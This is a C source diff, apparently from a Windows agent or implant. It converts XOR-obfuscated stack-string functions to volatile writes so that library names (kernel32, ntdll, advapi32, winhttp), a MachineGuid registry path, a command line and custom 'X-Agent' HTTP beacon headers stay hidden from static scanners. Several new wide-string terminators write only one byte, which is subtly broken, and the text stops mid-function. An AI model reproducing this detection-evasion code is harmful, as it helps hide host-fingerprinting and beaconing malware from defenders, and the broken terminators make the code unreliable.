@@ -22,943 +22,943 @@
 static VOID StrKernel32(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_KERNEL32;
-    buf[0] = (WCHAR)(0x31u ^ key);
-    buf[1] = (WCHAR)(0x3Fu ^ key);
-    buf[2] = (WCHAR)(0x28u ^ key);
-    buf[3] = (WCHAR)(0x34u ^ key);
-    buf[4] = (WCHAR)(0x3Fu ^ key);
-    buf[5] = (WCHAR)(0x36u ^ key);
-    buf[6] = (WCHAR)(0x69u ^ key);
-    buf[7] = (WCHAR)(0x68u ^ key);
-    buf[8] = (WCHAR)(0x74u ^ key);
-    buf[9] = (WCHAR)(0x3Eu ^ key);
-    buf[10] = (WCHAR)(0x36u ^ key);
-    buf[11] = (WCHAR)(0x36u ^ key);
-    buf[12] = 0;
+    *(volatile WCHAR *)&buf[0] = (0x31u ^ key);
+    *(volatile WCHAR *)&buf[1] = (0x3Fu ^ key);
+    *(volatile WCHAR *)&buf[2] = (0x28u ^ key);
+    *(volatile WCHAR *)&buf[3] = (0x34u ^ key);
+    *(volatile WCHAR *)&buf[4] = (0x3Fu ^ key);
+    *(volatile WCHAR *)&buf[5] = (0x36u ^ key);
+    *(volatile WCHAR *)&buf[6] = (0x69u ^ key);
+    *(volatile WCHAR *)&buf[7] = (0x68u ^ key);
+    *(volatile WCHAR *)&buf[8] = (0x74u ^ key);
+    *(volatile WCHAR *)&buf[9] = (0x3Eu ^ key);
+    *(volatile WCHAR *)&buf[10] = (0x36u ^ key);
+    *(volatile WCHAR *)&buf[11] = (0x36u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[12] = 0;
 }
 
 static VOID StrNtdll(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_NTDLL;
-    buf[0] = (WCHAR)(0x52u ^ key);
-    buf[1] = (WCHAR)(0x48u ^ key);
-    buf[2] = (WCHAR)(0x58u ^ key);
-    buf[3] = (WCHAR)(0x50u ^ key);
-    buf[4] = (WCHAR)(0x50u ^ key);
-    buf[5] = (WCHAR)(0x12u ^ key);
-    buf[6] = (WCHAR)(0x58u ^ key);
-    buf[7] = (WCHAR)(0x50u ^ key);
-    buf[8] = (WCHAR)(0x50u ^ key);
-    buf[9] = 0;
+    *(volatile WCHAR *)&buf[0] = (0x52u ^ key);
+    *(volatile WCHAR *)&buf[1] = (0x48u ^ key);
+    *(volatile WCHAR *)&buf[2] = (0x58u ^ key);
+    *(volatile WCHAR *)&buf[3] = (0x50u ^ key);
+    *(volatile WCHAR *)&buf[4] = (0x50u ^ key);
+    *(volatile WCHAR *)&buf[5] = (0x12u ^ key);
+    *(volatile WCHAR *)&buf[6] = (0x58u ^ key);
+    *(volatile WCHAR *)&buf[7] = (0x50u ^ key);
+    *(volatile WCHAR *)&buf[8] = (0x50u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[9] = 0;
 }
 
 static VOID StrAdvapi32(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_ADVAPI32;
-    buf[0] = (WCHAR)(0xC6u ^ key);
-    buf[1] = (WCHAR)(0xC3u ^ key);
-    buf[2] = (WCHAR)(0xD1u ^ key);
-    buf[3] = (WCHAR)(0xC6u ^ key);
-    buf[4] = (WCHAR)(0xD7u ^ key);
-    buf[5] = (WCHAR)(0xCEu ^ key);
-    buf[6] = (WCHAR)(0x94u ^ key);
-    buf[7] = (WCHAR)(0x95u ^ key);
-    buf[8] = (WCHAR)(0x89u ^ key);
-    buf[9] = (WCHAR)(0xC3u ^ key);
-    buf[10] = (WCHAR)(0xCBu ^ key);
-    buf[11] = (WCHAR)(0xCBu ^ key);
-    buf[12] = 0;
+    *(volatile WCHAR *)&buf[0] = (0xC6u ^ key);
+    *(volatile WCHAR *)&buf[1] = (0xC3u ^ key);
+    *(volatile WCHAR *)&buf[2] = (0xD1u ^ key);
+    *(volatile WCHAR *)&buf[3] = (0xC6u ^ key);
+    *(volatile WCHAR *)&buf[4] = (0xD7u ^ key);
+    *(volatile WCHAR *)&buf[5] = (0xCEu ^ key);
+    *(volatile WCHAR *)&buf[6] = (0x94u ^ key);
+    *(volatile WCHAR *)&buf[7] = (0x95u ^ key);
+    *(volatile WCHAR *)&buf[8] = (0x89u ^ key);
+    *(volatile WCHAR *)&buf[9] = (0xC3u ^ key);
+    *(volatile WCHAR *)&buf[10] = (0xCBu ^ key);
+    *(volatile WCHAR *)&buf[11] = (0xCBu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[12] = 0;
 }
 
 static VOID StrWinhttp(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_WINHTTP;
-    buf[0] = (WCHAR)(0x06u ^ key);
-    buf[1] = (WCHAR)(0x18u ^ key);
-    buf[2] = (WCHAR)(0x1Fu ^ key);
-    buf[3] = (WCHAR)(0x19u ^ key);
-    buf[4] = (WCHAR)(0x05u ^ key);
-    buf[5] = (WCHAR)(0x05u ^ key);
-    buf[6] = (WCHAR)(0x01u ^ key);
-    buf[7] = (WCHAR)(0x5Fu ^ key);
-    buf[8] = (WCHAR)(0x15u ^ key);
-    buf[9] = (WCHAR)(0x1Du ^ key);
-    buf[10] = (WCHAR)(0x1Du ^ key);
-    buf[11] = 0;
+    *(volatile WCHAR *)&buf[0] = (0x06u ^ key);
+    *(volatile WCHAR *)&buf[1] = (0x18u ^ key);
+    *(volatile WCHAR *)&buf[2] = (0x1Fu ^ key);
+    *(volatile WCHAR *)&buf[3] = (0x19u ^ key);
+    *(volatile WCHAR *)&buf[4] = (0x05u ^ key);
+    *(volatile WCHAR *)&buf[5] = (0x05u ^ key);
+    *(volatile WCHAR *)&buf[6] = (0x01u ^ key);
+    *(volatile WCHAR *)&buf[7] = (0x5Fu ^ key);
+    *(volatile WCHAR *)&buf[8] = (0x15u ^ key);
+    *(volatile WCHAR *)&buf[9] = (0x1Du ^ key);
+    *(volatile WCHAR *)&buf[10] = (0x1Du ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[11] = 0;
 }
 
 static VOID StrUserAgent(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_UA;
-    buf[0] = (WCHAR)(0xAEu ^ key);
-    buf[1] = (WCHAR)(0xAAu ^ key);
-    buf[2] = (WCHAR)(0xADu ^ key);
-    buf[3] = (WCHAR)(0xAAu ^ key);
-    buf[4] = (WCHAR)(0xAEu ^ key);
-    buf[5] = (WCHAR)(0xA2u ^ key);
-    buf[6] = (WCHAR)(0xAFu ^ key);
-    buf[7] = (WCHAR)(0x9Cu ^ key);
-    buf[8] = (WCHAR)(0xA2u ^ key);
-    buf[9] = (WCHAR)(0xA4u ^ key);
-    buf[10] = (WCHAR)(0xA6u ^ key);
-    buf[11] = (WCHAR)(0xADu ^ key);
-    buf[12] = (WCHAR)(0xB7u ^ key);
-    buf[13] = (WCHAR)(0xECu ^ key);
-    buf[14] = (WCHAR)(0xF2u ^ key);
-    buf[15] = (WCHAR)(0xEDu ^ key);
-    buf[16] = (WCHAR)(0xF3u ^ key);
-    buf[17] = 0;
+    *(volatile WCHAR *)&buf[0] = (0xAEu ^ key);
+    *(volatile WCHAR *)&buf[1] = (0xAAu ^ key);
+    *(volatile WCHAR *)&buf[2] = (0xADu ^ key);
+    *(volatile WCHAR *)&buf[3] = (0xAAu ^ key);
+    *(volatile WCHAR *)&buf[4] = (0xAEu ^ key);
+    *(volatile WCHAR *)&buf[5] = (0xA2u ^ key);
+    *(volatile WCHAR *)&buf[6] = (0xAFu ^ key);
+    *(volatile WCHAR *)&buf[7] = (0x9Cu ^ key);
+    *(volatile WCHAR *)&buf[8] = (0xA2u ^ key);
+    *(volatile WCHAR *)&buf[9] = (0xA4u ^ key);
+    *(volatile WCHAR *)&buf[10] = (0xA6u ^ key);
+    *(volatile WCHAR *)&buf[11] = (0xADu ^ key);
+    *(volatile WCHAR *)&buf[12] = (0xB7u ^ key);
+    *(volatile WCHAR *)&buf[13] = (0xECu ^ key);
+    *(volatile WCHAR *)&buf[14] = (0xF2u ^ key);
+    *(volatile WCHAR *)&buf[15] = (0xEDu ^ key);
+    *(volatile WCHAR *)&buf[16] = (0xF3u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[17] = 0;
 }
 
 static VOID StrCmdline(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_CMD;
-    buf[0] = (WCHAR)(0xF7u ^ key);
-    buf[1] = (WCHAR)(0xF9u ^ key);
-    buf[2] = (WCHAR)(0xF0u ^ key);
-    buf[3] = (WCHAR)(0xBAu ^ key);
-    buf[4] = (WCHAR)(0xF1u ^ key);
-    buf[5] = (WCHAR)(0xECu ^ key);
-    buf[6] = (WCHAR)(0xF1u ^ key);
-    buf[7] = (WCHAR)(0xB4u ^ key);
-    buf[8] = (WCHAR)(0xBBu ^ key);
-    buf[9] = (WCHAR)(0xDFu ^ key);
-    buf[10] = (WCHAR)(0xB4u ^ key);
-    buf[11] = (WCHAR)(0xF7u ^ key);
-    buf[12] = (WCHAR)(0xFCu ^ key);
-    buf[13] = (WCHAR)(0xF7u ^ key);
-    buf[14] = (WCHAR)(0xE4u ^ key);
-    buf[15] = (WCHAR)(0xB4u ^ key);
-    buf[16] = (WCHAR)(0xA2u ^ key);
-    buf[17] = (WCHAR)(0xA1u ^ key);
-    buf[18] = (WCHAR)(0xA4u ^ key);
-    buf[19] = (WCHAR)(0xA4u ^ key);
-    buf[20] = (WCHAR)(0xA5u ^ key);
-    buf[21] = (WCHAR)(0xB4u ^ key);
-    buf[22] = (WCHAR)(0xAAu ^ key);
-    buf[23] = (WCHAR)(0xFAu ^ key);
-    buf[24] = (WCHAR)(0xE1u ^ key);
-    buf[25] = (WCHAR)(0xF8u ^ key);
-    buf[26] = 0;
+    *(volatile WCHAR *)&buf[0] = (0xF7u ^ key);
+    *(volatile WCHAR *)&buf[1] = (0xF9u ^ key);
+    *(volatile WCHAR *)&buf[2] = (0xF0u ^ key);
+    *(volatile WCHAR *)&buf[3] = (0xBAu ^ key);
+    *(volatile WCHAR *)&buf[4] = (0xF1u ^ key);
+    *(volatile WCHAR *)&buf[5] = (0xECu ^ key);
+    *(volatile WCHAR *)&buf[6] = (0xF1u ^ key);
+    *(volatile WCHAR *)&buf[7] = (0xB4u ^ key);
+    *(volatile WCHAR *)&buf[8] = (0xBBu ^ key);
+    *(volatile WCHAR *)&buf[9] = (0xDFu ^ key);
+    *(volatile WCHAR *)&buf[10] = (0xB4u ^ key);
+    *(volatile WCHAR *)&buf[11] = (0xF7u ^ key);
+    *(volatile WCHAR *)&buf[12] = (0xFCu ^ key);
+    *(volatile WCHAR *)&buf[13] = (0xF7u ^ key);
+    *(volatile WCHAR *)&buf[14] = (0xE4u ^ key);
+    *(volatile WCHAR *)&buf[15] = (0xB4u ^ key);
+    *(volatile WCHAR *)&buf[16] = (0xA2u ^ key);
+    *(volatile WCHAR *)&buf[17] = (0xA1u ^ key);
+    *(volatile WCHAR *)&buf[18] = (0xA4u ^ key);
+    *(volatile WCHAR *)&buf[19] = (0xA4u ^ key);
+    *(volatile WCHAR *)&buf[20] = (0xA5u ^ key);
+    *(volatile WCHAR *)&buf[21] = (0xB4u ^ key);
+    *(volatile WCHAR *)&buf[22] = (0xAAu ^ key);
+    *(volatile WCHAR *)&buf[23] = (0xFAu ^ key);
+    *(volatile WCHAR *)&buf[24] = (0xE1u ^ key);
+    *(volatile WCHAR *)&buf[25] = (0xF8u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[26] = 0;
 }
 
 static VOID StrRegPath(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_REG;
-    buf[0] = (CHAR)(0x64u ^ key);
-    buf[1] = (CHAR)(0x78u ^ key);
-    buf[2] = (CHAR)(0x71u ^ key);
-    buf[3] = (CHAR)(0x63u ^ key);
-    buf[4] = (CHAR)(0x60u ^ key);
-    buf[5] = (CHAR)(0x76u ^ key);
-    buf[6] = (CHAR)(0x65u ^ key);
-    buf[7] = (CHAR)(0x72u ^ key);
-    buf[8] = (CHAR)(0x6Bu ^ key);
-    buf[9] = (CHAR)(0x7Au ^ key);
-    buf[10] = (CHAR)(0x5Eu ^ key);
-    buf[11] = (CHAR)(0x54u ^ key);
-    buf[12] = (CHAR)(0x45u ^ key);
-    buf[13] = (CHAR)(0x58u ^ key);
-    buf[14] = (CHAR)(0x44u ^ key);
-    buf[15] = (CHAR)(0x58u ^ key);
-    buf[16] = (CHAR)(0x51u ^ key);
-    buf[17] = (CHAR)(0x43u ^ key);
-    buf[18] = (CHAR)(0x6Bu ^ key);
-    buf[19] = (CHAR)(0x74u ^ key);
-    buf[20] = (CHAR)(0x45u ^ key);
-    buf[21] = (CHAR)(0x4Eu ^ key);
-    buf[22] = (CHAR)(0x47u ^ key);
-    buf[23] = (CHAR)(0x43u ^ key);
-    buf[24] = (CHAR)(0x58u ^ key);
-    buf[25] = (CHAR)(0x50u ^ key);
-    buf[26] = (CHAR)(0x45u ^ key);
-    buf[27] = (CHAR)(0x56u ^ key);
-    buf[28] = (CHAR)(0x47u ^ key);
-    buf[29] = (CHAR)(0x5Fu ^ key);
-    buf[30] = (CHAR)(0x4Eu ^ key);
-    buf[31] = 0;
+    *(volatile CHAR *)&buf[0] = (0x64u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x78u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x71u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x63u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x60u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x76u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x65u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x72u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x6Bu ^ key);
+    *(volatile CHAR *)&buf[9] = (0x7Au ^ key);
+    *(volatile CHAR *)&buf[10] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[11] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x58u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x44u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x58u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x51u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x43u ^ key);
+    *(volatile CHAR *)&buf[18] = (0x6Bu ^ key);
+    *(volatile CHAR *)&buf[19] = (0x74u ^ key);
+    *(volatile CHAR *)&buf[20] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[21] = (0x4Eu ^ key);
+    *(volatile CHAR *)&buf[22] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[23] = (0x43u ^ key);
+    *(volatile CHAR *)&buf[24] = (0x58u ^ key);
+    *(volatile CHAR *)&buf[25] = (0x50u ^ key);
+    *(volatile CHAR *)&buf[26] = (0x45u ^ key);
+    *(volatile CHAR *)&buf[27] = (0x56u ^ key);
+    *(volatile CHAR *)&buf[28] = (0x47u ^ key);
+    *(volatile CHAR *)&buf[29] = (0x5Fu ^ key);
+    *(volatile CHAR *)&buf[30] = (0x4Eu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[31] = 0;
 }
 
 static VOID StrMachineGuid(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_GUID;
-    buf[0] = (CHAR)(0x10u ^ key);
-    buf[1] = (CHAR)(0x3Cu ^ key);
-    buf[2] = (CHAR)(0x3Eu ^ key);
-    buf[3] = (CHAR)(0x35u ^ key);
-    buf[4] = (CHAR)(0x34u ^ key);
-    buf[5] = (CHAR)(0x33u ^ key);
-    buf[6] = (CHAR)(0x38u ^ key);
-    buf[7] = (CHAR)(0x1Au ^ key);
-    buf[8] = (CHAR)(0x28u ^ key);
-    buf[9] = (CHAR)(0x34u ^ key);
-    buf[10] = (CHAR)(0x39u ^ key);
-    buf[11] = 0;
+    *(volatile CHAR *)&buf[0] = (0x10u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x3Eu ^ key);
+    *(volatile CHAR *)&buf[3] = (0x35u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x33u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x38u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x1Au ^ key);
+    *(volatile CHAR *)&buf[8] = (0x28u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x39u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[11] = 0;
 }
 
 static VOID StrEnvUrl(PCHAR buf)
 {
     volatile UINT32 key = 0x4D;
-    buf[0] = (CHAR)(0x18u ^ key);
-    buf[1] = (CHAR)(0x1Fu ^ key);
-    buf[2] = (CHAR)(0x01u ^ key);
-    buf[3] = 0;
+    *(volatile CHAR *)&buf[0] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x1Fu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x01u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
 }
 
 static VOID StrCommitDefault(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_HASH;
-    buf[0] = (CHAR)(0x2Du ^ key);
-    buf[1] = (CHAR)(0x21u ^ key);
-    buf[2] = (CHAR)(0x3Bu ^ key);
-    buf[3] = (CHAR)(0x3Cu ^ key);
-    buf[4] = (CHAR)(0x3Du ^ key);
-    buf[5] = (CHAR)(0x2Bu ^ key);
-    buf[6] = (CHAR)(0x7Eu ^ key);
-    buf[7] = (CHAR)(0x7Fu ^ key);
-    buf[8] = 0;
+    *(volatile CHAR *)&buf[0] = (0x2Du ^ key);
+    *(volatile CHAR *)&buf[1] = (0x21u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x3Bu ^ key);
+    *(volatile CHAR *)&buf[3] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[4] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[5] = (0x2Bu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x7Eu ^ key);
+    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[8] = 0;
 }
 
 static VOID StrX64(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_X64;
-    buf[0] = (CHAR)(0x55u ^ key);
-    buf[1] = (CHAR)(0x1Bu ^ key);
-    buf[2] = (CHAR)(0x19u ^ key);
-    buf[3] = 0;
+    *(volatile CHAR *)&buf[0] = (0x55u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x1Bu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x19u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
 }
 
 static VOID StrX86(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_X86;
-    buf[0] = (CHAR)(0x99u ^ key);
-    buf[1] = (CHAR)(0xD9u ^ key);
-    buf[2] = (CHAR)(0xD7u ^ key);
-    buf[3] = 0;
+    *(volatile CHAR *)&buf[0] = (0x99u ^ key);
+    *(volatile CHAR *)&buf[1] = (0xD9u ^ key);
+    *(volatile CHAR *)&buf[2] = (0xD7u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
 }
 
 static VOID StrGetMethod(PCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_GET;
-    buf[0] = (CHAR)(0x3Du ^ key);
-    buf[1] = (CHAR)(0x3Fu ^ key);
-    buf[2] = (CHAR)(0x2Eu ^ key);
-    buf[3] = 0;
+    *(volatile CHAR *)&buf[0] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[1] = (0x3Fu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x2Eu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
 }
 
 static VOID StrGetMethodW(PWCHAR buf)
 {
     volatile UINT32 key = STACKSTR_KEY_GETW;
-    buf[0] = (WCHAR)(0x3Du ^ key);
-    buf[1] = (WCHAR)(0x3Fu ^ key);
-    buf[2] = (WCHAR)(0x2Eu ^ key);
-    buf[3] = 0;
+    *(volatile WCHAR *)&buf[0] = (0x3Du ^ key);
+    *(volatile WCHAR *)&buf[1] = (0x3Fu ^ key);
+    *(volatile WCHAR *)&buf[2] = (0x2Eu ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[3] = 0;
 }
 
 static VOID StrHdrApiVersion(PCHAR buf)
 {
     volatile UINT32 key = 0x6B;
-    buf[0] = (CHAR)(0x33u ^ key);
-    buf[1] = (CHAR)(0x46u ^ key);
-    buf[2] = (CHAR)(0x2Au ^ key);
-    buf[3] = (CHAR)(0x0Cu ^ key);
-    buf[4] = (CHAR)(0x0Eu ^ key);
-    buf[5] = (CHAR)(0x05u ^ key);
-    buf[6] = (CHAR)(0x1Fu ^ key);
-    buf[7] = (CHAR)(0x46u ^ key);
-    buf[8] = (CHAR)(0x2Au ^ key);
-    buf[9] = (CHAR)(0x1Bu ^ key);
-    buf[10] = (CHAR)(0x02u ^ key);
-    buf[11] = (CHAR)(0x46u ^ key);
-    buf[12] = (CHAR)(0x3Du ^ key);
-    buf[13] = (CHAR)(0x0Eu ^ key);
-    buf[14] = (CHAR)(0x19u ^ key);
-    buf[15] = (CHAR)(0x18u ^ key);
-    buf[16] = (CHAR)(0x02u ^ key);
-    buf[17] = (CHAR)(0x04u ^ key);
-    buf[18] = (CHAR)(0x05u ^ key);
-    buf[19] = (CHAR)(0x51u ^ key);
-    buf[20] = (CHAR)(0x4Bu ^ key);
-    buf[21] = (CHAR)(0x5Au ^ key);
-    buf[22] = (CHAR)(0x66u ^ key);
-    buf[23] = (CHAR)(0x61u ^ key);
-    buf[24] = 0;
+    *(volatile CHAR *)&buf[0] = (0x33u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x46u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x2Au ^ key);
+    *(volatile CHAR *)&buf[3] = (0x0Cu ^ key);
+    *(volatile CHAR *)&buf[4] = (0x0Eu ^ key);
+    *(volatile CHAR *)&buf[5] = (0x05u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x1Fu ^ key);
+    *(volatile CHAR *)&buf[7] = (0x46u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x2Au ^ key);
+    *(volatile CHAR *)&buf[9] = (0x1Bu ^ key);
+    *(volatile CHAR *)&buf[10] = (0x02u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x46u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[13] = (0x0Eu ^ key);
+    *(volatile CHAR *)&buf[14] = (0x19u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x18u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x02u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x04u ^ key);
+    *(volatile CHAR *)&buf[18] = (0x05u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x51u ^ key);
+    *(volatile CHAR *)&buf[20] = (0x4Bu ^ key);
+    *(volatile CHAR *)&buf[21] = (0x5Au ^ key);
+    *(volatile CHAR *)&buf[22] = (0x66u ^ key);
+    *(volatile CHAR *)&buf[23] = (0x61u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[24] = 0;
 }
 
 static VOID StrHdrNameId(PCHAR buf)
 {
     volatile UINT32 key = 0x39;
-    buf[0] = (CHAR)(0x61u ^ key);
-    buf[1] = (CHAR)(0x14u ^ key);
-    buf[2] = (CHAR)(0x78u ^ key);
-    buf[3] = (CHAR)(0x5Eu ^ key);
-    buf[4] = (CHAR)(0x5Cu ^ key);
-    buf[5] = (CHAR)(0x57u ^ key);
-    buf[6] = (CHAR)(0x4Du ^ key);
-    buf[7] = (CHAR)(0x14u ^ key);
-    buf[8] = (CHAR)(0x77u ^ key);
-    buf[9] = (CHAR)(0x58u ^ key);
-    buf[10] = (CHAR)(0x54u ^ key);
-    buf[11] = (CHAR)(0x5Cu ^ key);
-    buf[12] = (CHAR)(0x14u ^ key);
-    buf[13] = (CHAR)(0x70u ^ key);
-    buf[14] = (CHAR)(0x5Du ^ key);
-    buf[15] = (CHAR)(0x03u ^ key);
-    buf[16] = (CHAR)(0x19u ^ key);
-    buf[17] = (CHAR)(0x0Du ^ key);
-    buf[18] = (CHAR)(0x34u ^ key);
-    buf[19] = (CHAR)(0x33u ^ key);
-    buf[20] = 0;
+    *(volatile CHAR *)&buf[0] = (0x61u ^ key);
+    *(volatile CHAR *)&buf[1] = (0x14u ^ key);
+    *(volatile CHAR *)&buf[2] = (0x78u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x5Eu ^ key);
+    *(volatile CHAR *)&buf[4] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[5] = (0x57u ^ key);
+    *(volatile CHAR *)&buf[6] = (0x4Du ^ key);
+    *(volatile CHAR *)&buf[7] = (0x14u ^ key);
+    *(volatile CHAR *)&buf[8] = (0x77u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x58u ^ key);
+    *(volatile CHAR *)&buf[10] = (0x54u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x5Cu ^ key);
+    *(volatile CHAR *)&buf[12] = (0x14u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x70u ^ key);
+    *(volatile CHAR *)&buf[14] = (0x5Du ^ key);
+    *(volatile CHAR *)&buf[15] = (0x03u ^ key);
+    *(volatile CHAR *)&buf[16] = (0x19u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x0Du ^ key);
+    *(volatile CHAR *)&buf[18] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x33u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[20] = 0;
 }
 
 static VOID StrHdrPlatform(PCHAR buf)
 {
     volatile UINT32 key = 0x52;
-    buf[0] = (CHAR)(0x0Au ^ key);
-    buf[1] = (CHAR)(0x7Fu ^ key);
-    buf[2] = (CHAR)(0x13u ^ key);
-    buf[3] = (CHAR)(0x35u ^ key);
-    buf[4] = (CHAR)(0x37u ^ key);
-    buf[5] = (CHAR)(0x3Cu ^ key);
-    buf[6] = (CHAR)(0x26u ^ key);
-    buf[7] = (CHAR)(0x7Fu ^ key);
-    buf[8] = (CHAR)(0x02u ^ key);
-    buf[9] = (CHAR)(0x3Eu ^ key);
-    buf[10] = (CHAR)(0x33u ^ key);
-    buf[11] = (CHAR)(0x26u ^ key);
-    buf[12] = (CHAR)(0x34u ^ key);
-    buf[13] = (CHAR)(0x3Du ^ key);
-    buf[14] = (CHAR)(0x20u ^ key);
-    buf[15] = (CHAR)(0x3Fu ^ key);
-    buf[16] = (CHAR)(0x68u ^ key);
-    buf[17] = (CHAR)(0x72u ^ key);
-    buf[18] = (CHAR)(0x25u ^ key);
-    buf[19] = (CHAR)(0x3Bu ^ key);
-    buf[20] = (CHAR)(0x3Cu ^ key);
-    buf[21] = (CHAR)(0x36u ^ key);
-    buf[22] = (CHAR)(0x3Du ^ key);
-    buf[23] = (CHAR)(0x25u ^ key);
-    buf[24] = (CHAR)(0x21u ^ key);
-    buf[25] = (CHAR)(0x5Fu ^ key);
-    buf[26] = (CHAR)(0x58u ^ key);
-    buf[27] = 0;
+    *(volatile CHAR *)&buf[0] = (0x0Au ^ key);
+    *(volatile CHAR *)&buf[1] = (0x7Fu ^ key);
+    *(volatile CHAR *)&buf[2] = (0x13u ^ key);
+    *(volatile CHAR *)&buf[3] = (0x35u ^ key);
+    *(volatile CHAR *)&buf[4] = (0x37u ^ key);
+    *(volatile CHAR *)&buf[5] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[6] = (0x26u ^ key);
+    *(volatile CHAR *)&buf[7] = (0x7Fu ^ key);
+    *(volatile CHAR *)&buf[8] = (0x02u ^ key);
+    *(volatile CHAR *)&buf[9] = (0x3Eu ^ key);
+    *(volatile CHAR *)&buf[10] = (0x33u ^ key);
+    *(volatile CHAR *)&buf[11] = (0x26u ^ key);
+    *(volatile CHAR *)&buf[12] = (0x34u ^ key);
+    *(volatile CHAR *)&buf[13] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[14] = (0x20u ^ key);
+    *(volatile CHAR *)&buf[15] = (0x3Fu ^ key);
+    *(volatile CHAR *)&buf[16] = (0x68u ^ key);
+    *(volatile CHAR *)&buf[17] = (0x72u ^ key);
+    *(volatile CHAR *)&buf[18] = (0x25u ^ key);
+    *(volatile CHAR *)&buf[19] = (0x3Bu ^ key);
+    *(volatile CHAR *)&buf[20] = (0x3Cu ^ key);
+    *(volatile CHAR *)&buf[21] = (0x36u ^ key);
+    *(volatile CHAR *)&buf[22] = (0x3Du ^ key);
+    *(volatile CHAR *)&buf[23] = (0x25u ^ key);
+    *(volatile CHAR *)&buf[24] = (0x21u ^ key);
+    *(volatile CHAR *)&buf[25] = (0x5Fu ^ key);
+    *(volatile CHAR *)&buf[26] = (0x58u ^ key);
+    *(volatile CHAR *)&*(volatile WCHAR *)&buf[27] = 0;
 }
 
 static VOID StrHdrCaps(PCHAR buf)
 {
     volatile UINT32 key = 0x7D;
-    buf[0] = (CHAR)(0x25u ^ key);
-    buf[1] = (CHAR)(0x50u ^ key);
-    buf[2] = (CHAR)(0x3Cu ^ key);
-    buf[3] = (CHAR)(0x1Au ^ key);
-    buf[4] = (CHAR)(0x18u ^ key);
-    buf[5] = (CHAR)(0x13u ^ key);
-    buf[6] = (CHAR)(0x09u ^ key);
